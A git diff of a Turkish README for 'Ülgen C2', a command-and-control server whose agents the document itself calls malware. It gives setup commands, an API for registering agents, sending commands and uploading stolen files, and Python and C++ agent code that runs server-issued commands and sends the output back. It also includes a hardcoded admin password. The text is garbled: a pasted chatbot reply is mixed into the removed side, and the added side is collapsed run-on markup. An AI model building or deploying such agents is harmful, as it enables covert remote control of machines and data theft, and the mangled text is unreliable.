@@ -1,380 +1,7 @@
-# 🎯 Ülgen C2 - Komut Kontrol Sunucusu
-
-![Version](https://img.shields.io/badge/version-2.0-blue)
-![Node](https://img.shields.io/badge/node-18%2B-green)
-![License](https://img.shields.io/badge/license-MIT-orange)
-
-> ⚠️ **Educational Purpose Only**  
-> Bu proje yalnızca eğitim ve güvenlik araştırmaları için geliştirilmiştir.  
-> İzinsiz kullanım yasa dışıdır.
-
----
-
-## 📋 İçindekiler
-
-- [Özellikler](#-özellikler)
-- [Mimari Yapı](#-mimari-yapı)
-- [Kurulum](#-kurulum)
-- [Kullanım](#-kullanım)
-- [API Dokümantasyonu](#-api-dokümantasyonu)
-- [Ajan Geliştirme](#-ajan-geliştirme)
-- [Güvenlik Uyarıları](#️-güvenlik-uyarıları)
-- [SSS](#-sık-sorulan-sorular)
-- [Lisans](#-lisans)
-
----
-
-# ✨ Özellikler
-
-## 🔧 Temel Özellikler
-
-- Çift Port Mimarisi (443 - ajan, 9998 - admin panel)
-- HTTPS tabanlı iletişim (SSL/TLS)
-- Çoklu ajan desteği
-- Server-Sent Events ile gerçek zamanlı takip
-
-## 📁 Dosya Yönetimi
-
-- Çift yönlü dosya transferi
-- Base64 encoding
-- Kalıcı depolama (uploads klasörü)
-- Tek tık indirme
-
-## 🖥️ Yönetici Paneli
-
-- Modern koyu tema arayüz
-- Canlı ajan listesi
-- Komut terminali
-- Dosya gezgini
-- Dizin gezintisi (cd, ls, pwd)
-
----
-
-# 🏗️ Mimari Yapı
-Aşağıya **düzenlenmiş, profesyonel ve GitHub uyumlu** bir `README.md` formatı bıraktım.
-Rozetleri düzgün badge formatına çevirdim, kod bloklarını düzenledim ve yapıyı daha okunabilir hale getirdim.
-
-Bunu direkt `README.md` olarak koyabilirsin 👇
-
----
-
-```md
-# 🎯 Ülgen C2 - Komut Kontrol Sunucusu
-
-![Version](https://img.shields.io/badge/version-2.0-blue)
-![Node](https://img.shields.io/badge/node-18%2B-green)
-![License](https://img.shields.io/badge/license-MIT-orange)
-
-> ⚠️ **Educational Purpose Only**  
-> Bu proje yalnızca eğitim ve güvenlik araştırmaları için geliştirilmiştir.  
-> İzinsiz kullanım yasa dışıdır.
-
----
-
-## 📋 İçindekiler
-
-- [Özellikler](#-özellikler)
-- [Mimari Yapı](#-mimari-yapı)
-- [Kurulum](#-kurulum)
-- [Kullanım](#-kullanım)
-- [API Dokümantasyonu](#-api-dokümantasyonu)
-- [Ajan Geliştirme](#-ajan-geliştirme)
-- [Güvenlik Uyarıları](#️-güvenlik-uyarıları)
-- [SSS](#-sık-sorulan-sorular)
-- [Lisans](#-lisans)
-
----
-
-# ✨ Özellikler
-
-## 🔧 Temel Özellikler
-
-- Çift Port Mimarisi (443 - ajan, 9998 - admin panel)
-- HTTPS tabanlı iletişim (SSL/TLS)
-- Çoklu ajan desteği
-- Server-Sent Events ile gerçek zamanlı takip
-
-## 📁 Dosya Yönetimi
-
-- Çift yönlü dosya transferi
-- Base64 encoding
-- Kalıcı depolama (uploads klasörü)
-- Tek tık indirme
-
-## 🖥️ Yönetici Paneli
-
-- Modern koyu tema arayüz
-- Canlı ajan listesi
-- Komut terminali
-- Dosya gezgini
-- Dizin gezintisi (cd, ls, pwd)
-
----
-
-# 🏗️ Mimari Yapı
-
-```
-
-┌─────────────────┐     443      ┌──────────────┐
-│     Ajanlar     │ ◄─────────── │   C2 Sunucu  │
-│  (Client)       │              │  (Node.js)   │
-└─────────────────┘              └──────┬───────┘
-│ 9998
-┌────▼──────┐
-│ Yönetici  │
-│  Paneli   │
-└───────────┘
-
-````
-
-## Port Yapısı
-
-| Port | Kullanım | Açıklama |
-|------|----------|----------|
-| 443  | Ajan API | Komut ve veri transferi |
-| 9998 | Admin    | Web panel erişimi |
-
----
-
-# 🚀 Kurulum
-
-## Gereksinimler
-
-- Node.js 18+
-- npm veya yarn
-- OpenSSL
-- 443 portu için sudo yetkisi
-
-## Kurulum Adımları
-
-```bash
-git clone https://github.com/Subutay-CyberSecurity/Ulgen-Control-And-Commad-Server.git
-cd Ulgen-Control-And-Commad-Server
-npm install
-````
-
-### SSL Sertifikası Oluşturma
-
-```bash
-mkdir certs
-cd certs
-openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
-cd ..
-```
-
-### Sunucuyu Başlatma
-
-```bash
-mkdir uploads downloads
-sudo node server.js
-```
-
----
-
-# 🐳 Docker ile Kurulum
-
-```dockerfile
-FROM node:18
-WORKDIR /app
-COPY package*.json ./
-RUN npm install
-COPY . .
-EXPOSE 443 9998
-CMD ["node", "server.js"]
-```
-
-```bash
-docker build -t ulgen-c2 .
-docker run -p 443:443 -p 9998:9998 -v $(pwd)/uploads:/app/uploads ulgen-c2
-```
-
----
-
-# 🎮 Kullanım
-
-Admin Panel:
-
-```
-https://<sunucu_ip>:9998
-```
-
-Varsayılan şifreyi değiştirmeniz önerilir.
-
----
-
-# 📡 API Dokümantasyonu
-
-## Ajan Kaydı
-
-```http
-POST /api/game/register
-```
-
-## Komut Kontrolü
-
-```http
-GET /api/game/status/{agentId}
-```
-
-## Komut Çıktısı Gönderme
-
-```http
-POST /api/game/data
-```
-
-## Dosya Yükleme
-
-```http
-POST /api/agent/upload
-```
-
-## Dosya İndirme
-
-```http
-GET /api/files/{fileId}/download
-```
-
----
-
-# 🐍 Ajan Geliştirme (Örnek - Python)
-
-```python
-# Basitleştirilmiş örnek
-import requests
-import time
-
-SERVER = "https://SERVER_IP:443"
-agent_id = "agent_123"
-
-requests.post(f"{SERVER}/api/game/register",
-              json={"playerId": agent_id},
-              verify=False)
-
-while True:
-    r = requests.get(f"{SERVER}/api/game/status/{agent_id}",
-                     verify=False)
-    print(r.json())
-    time.sleep(3)
-```
-
----
-
-# ⚠️ Güvenlik Uyarıları
-
-* Sadece lab ortamında kullanın
-* İzinsiz sistemlerde test etmeyin
-* Varsayılan şifreyi değiştirin
-* SSL private key’i koruyun
-* Rate limiting ekleyin
-* Firewall konfigürasyonu yapın
-
----
-
-# ❓ Sık Sorulan Sorular
-
-### EACCES hatası alıyorum
-
-443 portu için root gerekir:
-
-```bash
-sudo node server.js
-```
-
-### SSL hatası alıyorum
-
-Self-signed sertifika kullanıyorsanız istemci tarafında doğrulamayı kapatmanız gerekir (sadece test ortamında).
-
----
-
-# 🤝 Katkıda Bulunma
-
-1. Fork
-2. Feature branch oluştur
-3. Commit
-4. Push
-5. Pull Request
-
----
-
-# 📜 Lisans
-
-MIT License
-
-```
-
----
-
-İstersen bir üst seviye versiyon da yapabiliriz:
-
-- MITRE ATT&CK mapping
-- Blue Team detection bölümü
-- Threat model diyagramı
-- CV için daha “research oriented” versiyon
-
-Onu yaparsak repo çok daha profesyonel görünür 👀
-```
-🎯 Ülgen C2 - Komut Kontrol Sunucusu
-
-https://img.shields.io/badge/version-2.0-blue
-https://img.shields.io/badge/node-18%252B-green
-https://img.shields.io/badge/license-MIT-orange
-
-Ülgen C2, güvenlik testleri ve eğitim amaçlı geliştirilmiş, çift portlu bir Komut Kontrol (Command & Control) sunucusudur. Ajanları yönetmek, komut çalıştırmak ve dosya transferi yapmak için tasarlanmıştır.
-📋 İçindekiler
-
-    Özellikler
-
-    Mimari Yapı
-
-    Kurulum
-
-    Kullanım
-
-    API Dokümantasyonu
-
-    Ajan (Malware) Geliştirme
-
-    Güvenlik Uyarıları
-
-    Sık Sorulan Sorular
-
-✨ Özellikler
-🔧 Temel Özellikler
-
-    Çift Port Mimarisi: 443 (ajan iletişimi) ve 9998 (yönetici paneli)
-
-    HTTPS Tabanlı: Tüm iletişim SSL/TLS ile şifrelenir
-
-    Çoklu Ajan Desteği: Aynı anda birden fazla ajanı yönetebilme
-
-    Gerçek Zamanlı Güncelleme: Server-Sent Events ile anlık ajan takibi
-
-📁 Dosya Yönetimi
-
-    Çift Yönlü Transfer: Ajan'dan sunucuya / sunucudan ajan'a dosya gönderme
-
-    Base64 Encode: Büyük dosyalar için optimize edilmiş transfer
-
-    Otomatik İndirme: Files sayfasında tek tıkla browser'a indirme
-
-    Kalıcı Depolama: Sunucu restartında dosyalar kaybolmaz
-
-🖥️ Yönetici Paneli
-
-    Modern Arayüz: Koyu tema, yeşil neon renkler
-
-    Canlı Ajan Listesi: Bağlı ajanları anlık görüntüleme
-
-    Komut Terminali: Ajanlara direkt komut gönderme
-
-    Dosya Gezgini: Tüm transfer edilen dosyaları listeleme
-
-    Dizin Gezintisi: cd, ls, pwd komutları ile ajanın dosya sisteminde gezinme
-
-🏗️ Mimari Yapı
-text
-
-┌─────────────────┐     443      ┌──────────────┐
+# 🎯 Ülgen C2 - Komut Kontrol Sunucusu[https://img.shields.io/badge/version-2.0-blue](https://img.shields.io/badge/version-2.0-blue" title="" target="_blank" rel="noreferrer)[https://img.shields.io/badge/node-18%252B-green](https://img.shields.io/badge/node-18%252B-green" title="" target="_blank" rel="noreferrer)[https://img.shields.io/badge/license-MIT-orange](https://img.shields.io/badge/license-MIT-orange" title="" target="_blank" rel="noreferrer)Ülgen
+ C2, güvenlik testleri ve eğitim amaçlı geliştirilmiş, çift portlu bir 
+Komut Kontrol (Command &amp; Control) sunucusudur. Ajanları yönetmek, 
+komut çalıştırmak ve dosya transferi yapmak için tasarlanmıştır.## 📋 İçindekilerÖzelliklerMimari YapıKurulumKullanımAPI DokümantasyonuAjan (Malware) GeliştirmeGüvenlik UyarılarıSık Sorulan Sorular## ✨ Özellikler### 🔧 Temel ÖzelliklerÇift Port Mimarisi: 443 (ajan iletişimi) ve 9998 (yönetici paneli)HTTPS Tabanlı: Tüm iletişim SSL/TLS ile şifrelenirÇoklu Ajan Desteği: Aynı anda birden fazla ajanı yönetebilmeGerçek Zamanlı Güncelleme: Server-Sent Events ile anlık ajan takibi### 📁 Dosya YönetimiÇift Yönlü Transfer: Ajan'dan sunucuya / sunucudan ajan'a dosya göndermeBase64 Encode: Büyük dosyalar için optimize edilmiş transferOtomatik İndirme: Files sayfasında tek tıkla browser'a indirmeKalıcı Depolama: Sunucu restartında dosyalar kaybolmaz### 🖥️ Yönetici PaneliModern Arayüz: Koyu tema, yeşil neon renklerCanlı Ajan Listesi: Bağlı ajanları anlık görüntülemeKomut Terminali: Ajanlara direkt komut göndermeDosya Gezgini: Tüm transfer edilen dosyaları listelemeDizin Gezintisi: cd, ls, pwd komutları ile ajanın dosya sisteminde gezinme## 🏗️ Mimari Yapıtext┌─────────────────┐     443      ┌──────────────┐
 │     Ajanlar     │ ◄─────────── │   C2 Sunucu  │
 │  (Malware)      │              │  (Node.js)   │
 └─────────────────┘              └──────┬───────┘
@@ -382,16 +9,7 @@ text
                                    ┌────▼──────┐
                                    │ Yönetici  │
                                    │  Paneli   │
-                                   └───────────┘
-
-Port Yapısı
-Port	Kullanım	Açıklama
-443	Ajan API	Ajanların bağlandığı, komut alıp veri gönderdiği port
-9998	Yönetici Paneli	Web arayüzü, ajan yönetimi ve dosya transferi
-Klasör Yapısı
-text
-
-c2-server/
+                                   └───────────┘### Port YapısıPortKullanımAçıklama443Ajan APIAjanların bağlandığı, komut alıp veri gönderdiği port9998Yönetici PaneliWeb arayüzü, ajan yönetimi ve dosya transferi### Klasör Yapısıtextc2-server/
 ├── 📁 certs/                 # SSL sertifikaları
 ├── 📁 public/                 # Web arayüzü dosyaları
 │   ├── 📄 login.html
@@ -401,23 +19,7 @@ c2-server/
 ├── 📁 downloads/              # Ajana giden dosyalar (geçici)
 ├── 📄 server.js                # Ana sunucu kodu
 ├── 📄 package.json
-└── 📄 README.md
-
-🚀 Kurulum
-Gereksinimler
-
-    Node.js 18+
-
-    npm veya yarn
-
-    OpenSSL (sertifika oluşturmak için)
-
-    sudo yetkisi (443 portu için)
-
-Adım Adım Kurulum
-bash
-
-# 1. Repoyu klonla
+└── 📄 README.md## 🚀 Kurulum### GereksinimlerNode.js 18+npm veya yarnOpenSSL (sertifika oluşturmak için)sudo yetkisi (443 portu için)### Adım Adım Kurulumbash# 1. Repoyu klonla
 git clone https://github.com/Subutay-CyberSecurity/Ulgen-Control-And-Commad-Server.git
 cd Ulgen-Control-And-Commad-Server
 
@@ -435,12 +37,7 @@ cd ..
 mkdir uploads downloads
 
 # 5. Sunucuyu başlat
-sudo node server.js
-
-Docker ile Kurulum (Opsiyonel)
-bash
-
-# Dockerfile
+sudo node server.js### Docker ile Kurulum (Opsiyonel)bash# Dockerfile
 FROM node:18
 WORKDIR /app
 COPY package*.json ./
@@ -451,23 +48,7 @@ CMD ["node", "server.js"]
 
 # Build ve run
 docker build -t ulgen-c2 .
-docker run -p 443:443 -p 9998:9998 -v $(pwd)/uploads:/app/uploads ulgen-c2
-
-🎮 Kullanım
-Yönetici Paneli
-
-    Tarayıcından https://<sunucu_ip>:9998 adresine git
-
-    Şifre: mow0BEBWgooxBLCiAVTm
-
-    Dashboard: Ajanları görüntüle, komut gönder
-
-    Files: Transfer edilen dosyaları indir
-
-Komut Gönderme
-text
-
-whoami              - Kullanıcı adını öğren
+docker run -p 443:443 -p 9998:9998 -v $(pwd)/uploads:/app/uploads ulgen-c2## 🎮 Kullanım### Yönetici PaneliTarayıcından https://&lt;sunucu_ip&gt;:9998 adresine gitŞifre: mow0BEBWgooxBLCiAVTmDashboard: Ajanları görüntüle, komut gönderFiles: Transfer edilen dosyaları indir### Komut Göndermetextwhoami              - Kullanıcı adını öğren
 ipconfig/ifconfig   - IP bilgilerini al
 ls -la              - Dosyaları listele
 cd /home/user       - Dizin değiştir
@@ -475,32 +56,7 @@ pwd                 - Mevcut dizini göster
 upload file.txt     - Dosyayı sunucuya gönder
 download file_id    - Sunucudan dosya indir
 info                - Sistem bilgilerini getir
-help                - Yardım menüsü
-
-Dosya Transferi
-📤 Ajan'a Dosya Gönderme (Admin → Ajan)
-
-    Dashboard'da ajanı seç
-
-    "DOSYA SEÇ" ile dosyayı seç
-
-    "DOSYA GÖNDER" butonuna tıkla
-
-📥 Ajandan Dosya Alma (Ajan → Admin)
-
-    Dashboard'da ajanı seç
-
-    "DOSYA YOLU" kısmına dosya yolunu yaz
-
-    "DOSYA İSTE" butonuna tıkla
-
-    Dosya otomatik browser'a iner
-
-📡 API Dokümantasyonu
-1. Ajan Kaydı
-http
-
-POST /api/game/register
+help                - Yardım menüsü### Dosya Transferi#### 📤 Ajan'a Dosya Gönderme (Admin → Ajan)Dashboard'da ajanı seç"DOSYA SEÇ" ile dosyayı seç"DOSYA GÖNDER" butonuna tıkla#### 📥 Ajandan Dosya Alma (Ajan → Admin)Dashboard'da ajanı seç"DOSYA YOLU" kısmına dosya yolunu yaz"DOSYA İSTE" butonuna tıklaDosya otomatik browser'a iner## 📡 API Dokümantasyonu### 1. Ajan KaydıhttpPOST /api/game/register
 Content-Type: application/json
 
 {
@@ -511,12 +67,7 @@ Content-Type: application/json
         "system": "Windows",
         "username": "user"
     }
-}
-
-2. Komut Kontrolü
-http
-
-GET /api/game/status/{agentId}
+}### 2. Komut KontrolühttpGET /api/game/status/{agentId}
 
 Response:
 {
@@ -525,12 +76,7 @@ Response:
         "command": "whoami",
         "command_id": "cmd_123456789_abc123"
     }
-}
-
-3. Komut Çıktısı Gönderme
-http
-
-POST /api/game/data
+}### 3. Komut Çıktısı GöndermehttpPOST /api/game/data
 Content-Type: application/json
 
 {
@@ -541,12 +87,7 @@ Content-Type: application/json
         "command": "whoami",
         "output": "root\n"
     }
-}
-
-4. Dosya Yükleme
-http
-
-POST /api/agent/upload
+}### 4. Dosya YüklemehttpPOST /api/agent/upload
 Content-Type: application/json
 
 {
@@ -556,19 +97,8 @@ Content-Type: application/json
         "size": 12345,
         "content": "base64_encoded_content"
     }
-}
-
-5. Dosya İndirme
-http
-
-GET /api/files/{fileId}/download
-# Response: Binary file
-
-🐍 Ajan (Malware) Geliştirme
-Python Örneği
-python
-
-#!/usr/bin/env python3
+}### 5. Dosya İndirmehttpGET /api/files/{fileId}/download
+# Response: Binary file## 🐍 Ajan (Malware) Geliştirme### Python Örneğipython#!/usr/bin/env python3
 import requests
 import time
 import subprocess
@@ -612,14 +142,9 @@ while True:
             }
         }, verify=False)
     
-    time.sleep(3)
-
-C++ Örneği (libcurl ile)
-cpp
-
-#include <iostream>
-#include <curl/curl.h>
-#include <nlohmann/json.hpp>
+    time.sleep(3)### C++ Örneği (libcurl ile)cpp#include &lt;iostream&gt;
+#include &lt;curl/curl.h&gt;
+#include &lt;nlohmann/json.hpp&gt;
 
 int main() {
     CURL* curl = curl_easy_init();
@@ -641,88 +166,10 @@ int main() {
         
         Sleep(3000);
     }
-}
-
-⚠️ Güvenlik Uyarıları
-🔒 Önemli Notlar
-
-    Bu araç sadece eğitim ve güvenlik testleri içindir
-
-    İzinsiz kullanımı yasa dışıdır
-
-    Kendi ağınızda veya izinli sistemlerde test edin
-
-    Varsayılan şifreyi değiştirin (PASSWORD sabiti)
-
-🔐 Güvenlik Önlemleri
-javascript
-
-// Varsayılan şifreyi değiştir
+}## ⚠️ Güvenlik Uyarıları### 🔒 Önemli NotlarBu araç sadece eğitim ve güvenlik testleri içindirİzinsiz kullanımı yasa dışıdırKendi ağınızda veya izinli sistemlerde test edinVarsayılan şifreyi değiştirin (PASSWORD sabiti)### 🔐 Güvenlik Önlemlerijavascript// Varsayılan şifreyi değiştir
 const PASSWORD = 'kendi_güçlü_şifren';
 
 // SSL sertifikalarını güvende tut
-chmod 600 certs/key.pem
-
-📝 Production İpuçları
-
-    Güçlü bir SSL sertifikası kullanın (Let's Encrypt)
-
-    Rate limiting ekleyin
-
-    İzleme ve loglama yapın
-
-    Düzenli yedekleme alın
-
-    Güvenlik duvarında sadece gerekli portları açın
-
-❓ Sık Sorulan Sorular
-Sunucu başlamıyor, "EACCES" hatası alıyorum?
-
-443 portu için root yetkisi gerekir:
-bash
-
-sudo node server.js
-
-Dosyalar gözükmüyor, restart'ta sıfırlanıyor?
-
-Yeni versiyonda uploads/ klasörü taranır. Eski dosyalar için:
-bash
-
-# Uploads klasörünü kontrol et
+chmod 600 certs/key.pem### 📝 Production İpuçlarıGüçlü bir SSL sertifikası kullanın (Let's Encrypt)Rate limiting ekleyinİzleme ve loglama yapınDüzenli yedekleme alınGüvenlik duvarında sadece gerekli portları açın## ❓ Sık Sorulan Sorular### Sunucu başlamıyor, "EACCES" hatası alıyorum?443 portu için root yetkisi gerekir:bashsudo node server.js### Dosyalar gözükmüyor, restart'ta sıfırlanıyor?Yeni versiyonda uploads/ klasörü taranır. Eski dosyalar için:bash# Uploads klasörünü kontrol et
 ls -la uploads/
-# Dosyalar varsa, server.js'de scanUploadsFolder() çalışıyor mu kontrol et
-
-Ajan bağlanamıyor, SSL hatası alıyorum?
-
-Self-signed sertifika kullanıyorsan verify=False kullan:
-python
-
-requests.get(url, verify=False)
-
-Performance için öneriler?
-
-    CHECK_INTERVAL = 3 (çok sık kontrol etmeyin)
-
-    Dosya limiti: 500mb (çok büyük dosyalar sorun çıkarır)
-
-    Heartbeat: 60 saniye (trafiği azaltır)
-
-🤝 Katkıda Bulunma
-
-    Fork'la
-
-    Feature branch oluştur (git checkout -b yeni-ozellik)
-
-    Değişiklikleri commit et (git commit -am 'Yeni özellik eklendi')
-
-    Branch'i pushla (git push origin yeni-ozellik)
-
-    Pull Request aç
-
-📞 İletişim
-
-    GitHub: @Subutay-CyberSecurity
-
-📜 Lisans
-
-Bu proje MIT lisansı ile lisanslanmıştır. Detaylar için LICENSE dosyasına bakın.
+# Dosyalar varsa, server.js'de scanUploadsFolder() çalışıyor mu kontrol et### Ajan bağlanamıyor, SSL hatası alıyorum?Self-signed sertifika kullanıyorsan verify=False kullan:pythonrequests.get(url, verify=False)### Performance için öneriler?CHECK_INTERVAL = 3 (çok sık kontrol etmeyin)Dosya limiti: 500mb (çok büyük dosyalar sorun çıkarır)Heartbeat: 60 saniye (trafiği azaltır)## 🤝 Katkıda BulunmaFork'laFeature branch oluştur (git checkout -b yeni-ozellik)Değişiklikleri commit et (git commit -am 'Yeni özellik eklendi')Branch'i pushla (git push origin yeni-ozellik)Pull Request aç## 📞 İletişimGitHub: [@Subutay-CyberSecurity](https://github.com/Subutay-CyberSecurity" target="_blank" rel="noreferrer)## 📜 LisansBu proje MIT lisansı ile lisanslanmıştır. Detaylar için [LICENSE](https://LICENSE" target="_blank" rel="noreferrer) dosyasına bakın.
